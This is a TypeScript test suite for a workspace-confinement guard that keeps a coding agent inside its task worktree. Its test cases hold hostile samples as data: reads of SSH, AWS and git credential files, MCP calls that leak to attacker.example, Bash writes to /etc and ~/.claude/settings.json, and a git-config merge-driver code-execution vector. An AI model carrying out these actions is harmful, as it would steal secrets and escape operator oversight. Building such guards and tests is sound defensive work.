/// <reference types="bun" />
import * as os from 'node:os';
import * as path from 'node:path';
import { describe, expect, test } from 'bun:test';

import {
  evaluateWorkspaceConfinement,
  GIT_CONFIG_PROTECTION_RULE_ID,
  MCP_CONTAINMENT_RULE_ID,
  SENSITIVE_READ_RULE_ID,
  WORKSPACE_CONFINEMENT_RULE_ID,
} from './workspace-confinement.js';

// The reported bug: cwd is the task worktree, nested inside the main checkout, so
// the main repo root is a trivial parent of cwd.
const WORKTREE = '/repo/.nightcore/worktrees/task-1';
const MAIN = '/repo';

describe('evaluateWorkspaceConfinement — file mutations', () => {
  test.each(['Write', 'Edit', 'MultiEdit'])(
    'denies %s targeting an absolute path in the parent (main) checkout',
    (tool) => {
      const verdict = evaluateWorkspaceConfinement(
        tool,
        { file_path: `${MAIN}/apps/web/src/components/board/status.ts` },
        WORKTREE,
      );
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
      // The reason names both the working dir and the offending target so the
      // agent can adapt.
      expect(verdict.reason).toContain(WORKTREE);
      expect(verdict.reason).toContain(`${MAIN}/apps/web`);
    },
  );

  test('denies NotebookEdit outside cwd (notebook_path key)', () => {
    const verdict = evaluateWorkspaceConfinement(
      'NotebookEdit',
      { notebook_path: `${MAIN}/analysis.ipynb` },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
  });

  test('allows an absolute path INSIDE cwd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Edit',
        { file_path: `${WORKTREE}/apps/web/x.ts` },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('resolves a relative path against cwd → allowed', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Write',
        { file_path: 'apps/web/x.ts' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('allows a write into the OS temp dir (scratch files)', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Write',
        { file_path: path.join(os.tmpdir(), 'nightcore-scratch.txt') },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('a sibling whose name PREFIXES cwd is not treated as inside (trailing-sep guard)', () => {
    // `/repo/.nightcore/worktrees/task-1-evil` must NOT count as inside task-1.
    expect(
      evaluateWorkspaceConfinement(
        'Edit',
        { file_path: `${WORKTREE}-evil/x.ts` },
        WORKTREE,
      ).denied,
    ).toBe(true);
  });

  test('an empty cwd disables the gate (nothing to confine to)', () => {
    expect(
      evaluateWorkspaceConfinement('Edit', { file_path: '/anywhere/x.ts' }, '')
        .denied,
    ).toBe(false);
  });

  test('a non-secret read outside cwd stays allowed (denylist, not blanket confinement)', () => {
    // Reads are NOT blanket-confined to cwd — only known secret targets are denied.
    // A plain source/manifest read in the parent checkout must still work (e.g.
    // hoisted node_modules / sibling packages in worktree mode).
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: `${MAIN}/package.json` },
        WORKTREE,
      ).denied,
    ).toBe(false);
    // Grep/Glob are not inspected by the read guard at all.
    expect(
      evaluateWorkspaceConfinement('Grep', { pattern: 'x' }, WORKTREE).denied,
    ).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — sensitive read guard', () => {
  const HOME = os.homedir();

  test.each([
    ['AWS credentials', path.join(HOME, '.aws/credentials')],
    ['SSH private key', path.join(HOME, '.ssh/id_rsa')],
    ['SSH ed25519 key', path.join(HOME, '.ssh/id_ed25519')],
    ['Claude credential file', path.join(HOME, '.claude.json')],
    ['gcloud config', path.join(HOME, '.config/gcloud/credentials.db')],
    ['gh config', path.join(HOME, '.config/gh/hosts.yml')],
    ['npm token file', path.join(HOME, '.npmrc')],
    ['git credentials', path.join(HOME, '.git-credentials')],
    ['docker config', path.join(HOME, '.docker/config.json')],
  ])('denies Read of a home credential store (%s)', (_label, file) => {
    const verdict = evaluateWorkspaceConfinement('Read', { file_path: file }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(SENSITIVE_READ_RULE_ID);
    expect(verdict.reason).toContain(WORKTREE);
  });

  test("denies Read of another project's .env (a portable secret outside the run roots)", () => {
    // A sibling checkout's env — the exact cross-project leak the finding names.
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: '/some/other/project/.env' },
        WORKTREE,
      ).denied,
    ).toBe(true);
    // The MAIN checkout's .env (outside the worktree cwd) is likewise refused.
    expect(
      evaluateWorkspaceConfinement('Read', { file_path: `${MAIN}/.env` }, WORKTREE)
        .denied,
    ).toBe(true);
    // …incl. environment-specific variants.
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: `${MAIN}/.env.production` },
        WORKTREE,
      ).denied,
    ).toBe(true);
  });

  test("allows Read of the task's OWN in-cwd .env (its project's env is fine)", () => {
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: `${WORKTREE}/.env` },
        WORKTREE,
      ).denied,
    ).toBe(false);
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: `${WORKTREE}/apps/web/.env.local` },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('allows Read of a non-secret .env template outside cwd (.env.example)', () => {
    for (const name of ['.env.example', '.env.sample', '.env.template']) {
      expect(
        evaluateWorkspaceConfinement(
          'Read',
          { file_path: `${MAIN}/${name}` },
          WORKTREE,
        ).denied,
      ).toBe(false);
    }
  });

  test('denies a `..` traversal that normalizes into a home credential store', () => {
    // Lexical resolution normalizes `..` before the check, so it can't be dodged.
    const viaTraversal = `${HOME}/.aws/nested/../credentials`;
    expect(
      evaluateWorkspaceConfinement('Read', { file_path: viaTraversal }, WORKTREE)
        .denied,
    ).toBe(true);
  });

  test('an unreadable/absent Read target fails OPEN (guard is a denylist)', () => {
    // Unlike the mutation side (fail-closed), a read with no target degrades to
    // allow — the guard only ever denies targets it positively recognizes.
    expect(evaluateWorkspaceConfinement('Read', {}, WORKTREE).denied).toBe(false);
    expect(
      evaluateWorkspaceConfinement('Read', { file_path: 123 }, WORKTREE).denied,
    ).toBe(false);
  });

  test('an empty cwd disables the read guard too', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: path.join(HOME, '.aws/credentials') },
        '',
      ).denied,
    ).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — fail-closed on unreadable target', () => {
  test.each([
    ['missing key', {}],
    ['non-string value', { file_path: 123 }],
    ['empty string', { file_path: '' }],
    ['null input', null],
  ] as const)(
    'DENIES a known mutation tool (Edit) whose target is unreadable (%s)',
    (_label, input) => {
      const verdict = evaluateWorkspaceConfinement('Edit', input, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
    },
  );
});

describe('evaluateWorkspaceConfinement — ApplyPatch (multi-target patch body)', () => {
  test('denies an apply-patch body that Updates a file in the parent (main) checkout', () => {
    const patch = [
      '*** Begin Patch',
      `*** Update File: ${MAIN}/apps/web/src/main.ts`,
      '@@',
      '-a',
      '+b',
      '*** End Patch',
    ].join('\n');
    const verdict = evaluateWorkspaceConfinement('ApplyPatch', { patch }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
    expect(verdict.reason).toContain(`${MAIN}/apps/web`);
  });

  test('denies when ANY target in a multi-file patch escapes cwd', () => {
    const patch = [
      '*** Begin Patch',
      '*** Update File: src/in-cwd.ts',
      '*** Add File: /etc/cron.d/evil',
      '*** End Patch',
    ].join('\n');
    expect(
      evaluateWorkspaceConfinement('ApplyPatch', { patch }, WORKTREE).denied,
    ).toBe(true);
  });

  test('denies an apply-patch that writes ~/.claude via an absolute Add File', () => {
    const patch = [
      '*** Begin Patch',
      `*** Add File: ${os.homedir()}/.claude/settings.json`,
      '*** End Patch',
    ].join('\n');
    expect(
      evaluateWorkspaceConfinement('ApplyPatch', { patch }, WORKTREE).denied,
    ).toBe(true);
  });

  test('allows an apply-patch whose targets are all inside cwd (relative + absolute)', () => {
    const patch = [
      '*** Begin Patch',
      '*** Update File: src/a.ts',
      `*** Add File: ${WORKTREE}/src/b.ts`,
      '*** Delete File: src/c.ts',
      '*** End Patch',
    ].join('\n');
    expect(
      evaluateWorkspaceConfinement('ApplyPatch', { patch }, WORKTREE).denied,
    ).toBe(false);
  });

  test('also honors a direct file_path arg (harness-parity key) outside cwd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'ApplyPatch',
        { file_path: `${MAIN}/pkg/x.ts` },
        WORKTREE,
      ).denied,
    ).toBe(true);
  });

  test('FAIL-CLOSED: an ApplyPatch with no inspectable target is denied', () => {
    for (const input of [{}, { patch: 'no file markers here' }, null] as const) {
      const verdict = evaluateWorkspaceConfinement('ApplyPatch', input, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
    }
  });
});

describe('evaluateWorkspaceConfinement — temp allowance', () => {
  const TMP_REPO = path.join(os.tmpdir(), 'nc-scratch');
  const TMP_WORKTREE = path.join(TMP_REPO, '.nightcore/worktrees/task-1');

  test('a write to the OS temp dir is allowed when cwd is NOT under temp', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Write',
        { file_path: path.join(os.tmpdir(), 'scratch.txt') },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('the temp allowance is DROPPED when cwd itself is under temp (no fail-open)', () => {
    // cwd is a worktree hosted under the OS temp dir (the dogfood scratch repo).
    // A write to the scratch repo's MAIN tree (a temp sibling of cwd) must still
    // be denied — otherwise the temp allowance would swallow the whole repo.
    const verdict = evaluateWorkspaceConfinement(
      'Edit',
      { file_path: path.join(TMP_REPO, 'apps/web/status.ts') },
      TMP_WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    // …but a write INSIDE that temp-hosted cwd is still allowed.
    expect(
      evaluateWorkspaceConfinement(
        'Edit',
        { file_path: path.join(TMP_WORKTREE, 'apps/web/status.ts') },
        TMP_WORKTREE,
      ).denied,
    ).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — MCP write/network fallback (bypass)', () => {
  test('denies a network-capable MCP tool outright (egress uncontainable)', () => {
    for (const tool of [
      'mcp__acme__http_post',
      'mcp__acme__fetch_url',
      'mcp__acme__send_email',
      'mcp__acme__upload_file',
    ]) {
      const verdict = evaluateWorkspaceConfinement(tool, { url: 'https://evil.com' }, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
    }
  });

  test('denies a write-capable MCP tool whose target resolves outside cwd', () => {
    const verdict = evaluateWorkspaceConfinement(
      'mcp__fs__write_file',
      { path: `${MAIN}/apps/web/x.ts`, content: 'x' },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
    expect(verdict.reason).toContain(`${MAIN}/apps/web`);
  });

  test('denies a write-capable MCP tool with NO inspectable path (fail-closed)', () => {
    const verdict = evaluateWorkspaceConfinement(
      'mcp__db__create_record',
      { table: 'users', value: 'x' },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
  });

  test('allows a write-capable MCP tool whose target is inside cwd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'mcp__fs__write_file',
        { path: `${WORKTREE}/notes.txt`, content: 'x' },
        WORKTREE,
      ).denied,
    ).toBe(false);
    // …and a relative path resolves against cwd → inside → allowed.
    expect(
      evaluateWorkspaceConfinement(
        'mcp__fs__edit_file',
        { file_path: 'src/app.ts' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('leaves a read/query MCP tool alone (falls through to allow)', () => {
    for (const tool of ['mcp__db__query', 'mcp__docs__search', 'mcp__fs__list_dir']) {
      expect(
        evaluateWorkspaceConfinement(tool, { q: 'select 1' }, WORKTREE).denied,
      ).toBe(false);
    }
  });

  test('#222: a read-verb MCP tool carrying a URL arg is denied (in-URL egress)', () => {
    // `get`/`search`/`lookup`/`resolve` read as benign by name, but a URL-valued
    // argument is an off-machine egress channel — promoted to network and denied
    // under bypass BEFORE the read allowlist can auto-allow it.
    for (const tool of [
      'mcp__docs__get',
      'mcp__web__search',
      'mcp__dns__resolve',
      'mcp__registry__lookup',
    ]) {
      const verdict = evaluateWorkspaceConfinement(
        tool,
        { q: 'x', endpoint: 'https://attacker.example/?leak=secret' },
        WORKTREE,
      );
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
    }
  });

  test('#222: the same read-verb tool WITHOUT a URL arg still falls through to read', () => {
    for (const tool of ['mcp__docs__get', 'mcp__web__search', 'mcp__dns__resolve']) {
      expect(
        evaluateWorkspaceConfinement(tool, { q: 'plain query', id: 42 }, WORKTREE)
          .denied,
      ).toBe(false);
    }
  });

  test('#222: nested- and array-carried URLs are denied (recursion, not just top-level)', () => {
    // The COMMON real-MCP shapes the top-level-only scan missed: a URL one level
    // under an object key, inside an array, and nested under `get`/`query`
    // verbs specifically. All must promote to network and deny under bypass.
    const cases: Array<[string, unknown]> = [
      ['mcp__api__get', { params: { url: 'https://attacker.example/?leak' } }],
      ['mcp__web__query', { targets: ['https://attacker.example/?leak'] }],
      ['mcp__web__query', { opts: { url: 'https://attacker.example/?leak' } }],
      [
        'mcp__docs__get',
        { request: { method: 'GET', urls: ['https://attacker.example/?leak'] } },
      ],
    ];
    for (const [tool, input] of cases) {
      const verdict = evaluateWorkspaceConfinement(tool, input, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
    }
  });

  test('#222: a genuinely URL-free nested/array read input is NOT over-promoted', () => {
    for (const input of [
      { params: { q: 'select 1', limit: 10 } },
      { targets: ['docs/readme.md', 'src/app.ts'] },
      { opts: { nested: { deeper: 'plain string', n: 3 } } },
    ]) {
      expect(
        evaluateWorkspaceConfinement('mcp__web__query', input, WORKTREE).denied,
      ).toBe(false);
    }
  });

  test('FAIL-CLOSED: an unknown-capability MCP action is denied (not "other → allowed")', () => {
    // The finding's exact vectors: a `sync`/`process`-style tool matches no
    // read/write/network keyword, so under bypass (no canUseTool prompt) it must be
    // refused rather than run unconfined.
    for (const tool of ['mcp__x__sync', 'mcp__x__process', 'mcp__x__frobnicate']) {
      const verdict = evaluateWorkspaceConfinement(tool, {}, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
    }
  });

  test('classifies by the ACTION, not the server name', () => {
    // Server named `http_server` must not make a plain list read look like egress.
    expect(
      evaluateWorkspaceConfinement(
        'mcp__http_server__list_files',
        { dir: '.' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('an empty cwd disables the MCP fallback too', () => {
    expect(
      evaluateWorkspaceConfinement('mcp__acme__http_post', { url: 'https://evil.com' }, '')
        .denied,
    ).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — Bash cd escape (best-effort)', () => {
  test('denies an absolute `cd` to a path outside cwd', () => {
    const verdict = evaluateWorkspaceConfinement(
      'Bash',
      { command: 'cd /repo && bun run typecheck' },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.reason).toContain(MAIN);
  });

  test('denies `pushd` to an absolute path outside cwd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: 'pushd /etc' },
        WORKTREE,
      ).denied,
    ).toBe(true);
  });

  test('allows a relative `cd` (stays within cwd subtree)', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: 'cd apps/web && bun test' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('allows an absolute `cd` INSIDE cwd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: `cd ${WORKTREE}/apps/web && ls` },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('does not flag a dynamic cd target it cannot resolve lexically', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: 'cd "$(mktemp -d)" && touch x' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('allows a benign Bash command with no cd', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: 'bun run typecheck' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — Bash write escape (best-effort)', () => {
  const denies = (command: string): boolean =>
    evaluateWorkspaceConfinement('Bash', { command }, WORKTREE).denied;

  test.each([
    ['redirect to an absolute path', 'echo payload > /etc/cron.d/evil'],
    ['spaced append redirect out of cwd', 'echo x >> /var/tmp/loot'],
    ['glued fd redirect out of cwd', 'echo x 2>/etc/shadow-copy'],
    ['tee to an absolute path', 'echo x | tee /etc/hosts'],
    ['cp destination out of cwd', 'cp ./secret /etc/evil'],
    ['cp -t target-directory out of cwd', 'cp -t /etc a b'],
    ['mv destination out of cwd', 'mv ./a /usr/local/bin/b'],
    ['dd of= out of cwd', 'dd if=./x of=/etc/passwd2'],
    ['sed -i on an absolute file out of cwd', "sed -i 's/a/b/' /etc/hosts"],
    ['ln -s pointing out of cwd', 'ln -s /repo escape'],
    ['sh -c subshell hiding the redirect', "sh -c 'echo x > /etc/evil'"],
    ['bash -c subshell hiding a tee', "bash -c \"echo x | tee /etc/evil\""],
  ] as const)('denies %s', (_label, command) => {
    const verdict = evaluateWorkspaceConfinement('Bash', { command }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(WORKSPACE_CONFINEMENT_RULE_ID);
  });

  test('denies a redirect that poisons ~/.claude (config-injection → persistent RCE)', () => {
    for (const command of [
      'echo "{}" > ~/.claude/settings.json',
      'echo "{}" > $HOME/.claude/settings.json',
    ]) {
      expect(denies(command)).toBe(true);
    }
  });

  test.each([
    ['relative redirect stays in cwd', 'bun run build > build.log 2>&1'],
    ['redirect to ./ path', 'echo x > ./out/report.txt'],
    ['/dev/null sink is benign', 'bun test > /dev/null 2>&1'],
    ['in-cwd tee', 'echo x | tee ./notes.txt'],
    ['local cp with relative dest', 'cp ./a ./b'],
    ['reading an absolute source is not a write', 'cat /etc/hosts'],
    ['sed without -i (no in-place write)', "sed 's/a/b/' /etc/hosts"],
    ['dynamic redirect target it cannot resolve', 'echo x > "$TMPDIR/scratch"'],
  ] as const)('allows %s', (_label, command) => {
    expect(denies(command)).toBe(false);
  });

  test('allows an absolute redirect INSIDE cwd', () => {
    expect(denies(`echo x > ${WORKTREE}/out.txt`)).toBe(false);
  });
});

describe('evaluateWorkspaceConfinement — git config write protection (issue #221)', () => {
  // A committed `.gitattributes` (`* merge=evil`) + a `[merge "evil"] driver=<cmd>`
  // in `.git/config` makes git EXECUTE `<cmd>` on the host during merge/checkout/add.
  // The driver NAME is attacker-chosen so an allowlist can't enumerate it — the fix
  // is to DENY writing `.git/config` at all. This gate is a pure function with no
  // permission-mode parameter: HookBus fires it on EVERY PreToolUse regardless of
  // mode (incl. bypassPermissions), so these denies hold under the default unattended
  // config, and they fire even when `.git/config` sits INSIDE the run cwd (where
  // ordinary confinement would otherwise allow it).

  test.each(['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])(
    'denies %s to an in-cwd .git/config',
    (tool) => {
      const key = tool === 'NotebookEdit' ? 'notebook_path' : 'file_path';
      const verdict = evaluateWorkspaceConfinement(
        tool,
        { [key]: `${WORKTREE}/.git/config` },
        WORKTREE,
      );
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
      expect(verdict.reason).toContain('.git/config');
    },
  );

  test('denies a write to .git/config in MAIN mode (cwd = repo root)', () => {
    const verdict = evaluateWorkspaceConfinement(
      'Write',
      { file_path: `${MAIN}/.git/config` },
      MAIN,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies a relative .git/config write (resolved against cwd)', () => {
    const verdict = evaluateWorkspaceConfinement(
      'Write',
      { file_path: '.git/config' },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies a NESTED .git/config at any depth', () => {
    const verdict = evaluateWorkspaceConfinement(
      'Edit',
      { file_path: `${WORKTREE}/vendor/dep/.git/config` },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies the .git/config write even when it ESCAPES cwd (git-config reason wins)', () => {
    // In worktree mode the shared common dir sits OUTSIDE cwd; the write is refused
    // with the SPECIFIC git-config reason rather than the generic escape reason.
    const verdict = evaluateWorkspaceConfinement(
      'Write',
      { file_path: `${MAIN}/.git/config` },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies a case-variant .GIT/Config (folding only strengthens the block)', () => {
    const verdict = evaluateWorkspaceConfinement(
      'Write',
      { file_path: `${WORKTREE}/.GIT/Config` },
      WORKTREE,
    );
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies an ApplyPatch whose body writes .git/config', () => {
    const patch = [
      '*** Begin Patch',
      '*** Add File: .git/config',
      '*** End Patch',
    ].join('\n');
    const verdict = evaluateWorkspaceConfinement('ApplyPatch', { patch }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test.each([
    ['truncating redirect', 'echo "[core]" > .git/config'],
    ['append redirect', 'echo x >> .git/config'],
    ['tee into .git/config', 'echo x | tee .git/config'],
    ['sh -c subshell hiding the redirect', "sh -c 'echo x >> .git/config'"],
  ] as const)('denies a Bash write to .git/config (%s)', (_label, command) => {
    const verdict = evaluateWorkspaceConfinement('Bash', { command }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  // config.worktree is a FULL config surface under `extensions.worktreeConfig=true`
  // (git auto-enables it on `git sparse-checkout set` in a worktree), and the
  // per-worktree `.git/worktrees/<name>/config[.worktree]` is read the same way — both
  // carry the exact same [merge "x"] driver / filter / diff host-RCE, so both DENY.
  test.each([
    ['native config.worktree in MAIN mode', 'Write', `${MAIN}/.git/config.worktree`, MAIN],
    ['native per-worktree config in MAIN mode', 'Write', `${MAIN}/.git/worktrees/wt1/config`, MAIN],
    ['native per-worktree config.worktree in MAIN mode', 'Write', `${MAIN}/.git/worktrees/wt1/config.worktree`, MAIN],
    ['native in-cwd config.worktree (worktree mode)', 'Edit', `${WORKTREE}/.git/config.worktree`, WORKTREE],
    ['native in-cwd per-worktree config (worktree mode)', 'Edit', `${WORKTREE}/.git/worktrees/wt1/config`, WORKTREE],
    ['native NESTED per-worktree config.worktree', 'Write', `${WORKTREE}/vendor/dep/.git/worktrees/wt1/config.worktree`, WORKTREE],
  ] as const)('denies %s', (_label, tool, file, cwd) => {
    const verdict = evaluateWorkspaceConfinement(tool, { file_path: file }, cwd);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test('denies RELATIVE writes to config.worktree and the per-worktree config', () => {
    for (const rel of [
      '.git/config.worktree',
      '.git/worktrees/wt1/config',
      '.git/worktrees/wt1/config.worktree',
    ]) {
      const verdict = evaluateWorkspaceConfinement('Write', { file_path: rel }, WORKTREE);
      expect(verdict.denied).toBe(true);
      expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
    }
  });

  test.each([
    ['config.worktree append redirect', 'echo x >> .git/config.worktree'],
    ['per-worktree config redirect', 'echo x > .git/worktrees/wt1/config'],
    ['per-worktree config.worktree tee', 'echo x | tee .git/worktrees/wt1/config.worktree'],
  ] as const)('denies a Bash write to a worktree config surface (%s)', (_label, command) => {
    const verdict = evaluateWorkspaceConfinement('Bash', { command }, WORKTREE);
    expect(verdict.denied).toBe(true);
    expect(verdict.ruleId).toBe(GIT_CONFIG_PROTECTION_RULE_ID);
  });

  test.each([
    ['a ref update', `${WORKTREE}/.git/refs/heads/feature`],
    ['the index', `${WORKTREE}/.git/index`],
    ['HEAD', `${WORKTREE}/.git/HEAD`],
    ['a git hook (exec-sink ASK gate handles it, not this DENY)', `${WORKTREE}/.git/hooks/pre-commit`],
    ['a file named config NOT directly under .git', `${WORKTREE}/.git/hooks/config`],
    ['a GitHub config (.github, not .git)', `${WORKTREE}/.github/config`],
    ['a repo whose dir merely ends in .git', `${WORKTREE}/x.git/config`],
    ['an ordinary in-cwd config file', `${WORKTREE}/src/config`],
    ['an ordinary source file', `${WORKTREE}/apps/web/x.ts`],
  ] as const)('ALLOWS a normal in-cwd write (%s)', (_label, file) => {
    expect(
      evaluateWorkspaceConfinement('Write', { file_path: file }, WORKTREE).denied,
    ).toBe(false);
  });

  test('does NOT block a READ of .git/config (this is a mutation gate only)', () => {
    expect(
      evaluateWorkspaceConfinement(
        'Read',
        { file_path: `${WORKTREE}/.git/config` },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });

  test('a Bash write to a NON-config .git file is not caught by this rule', () => {
    // A `.git/refs/...` redirect stays in-cwd and is allowed — only `config` is denied.
    expect(
      evaluateWorkspaceConfinement(
        'Bash',
        { command: 'echo abc > .git/refs/heads/x' },
        WORKTREE,
      ).denied,
    ).toBe(false);
  });
});
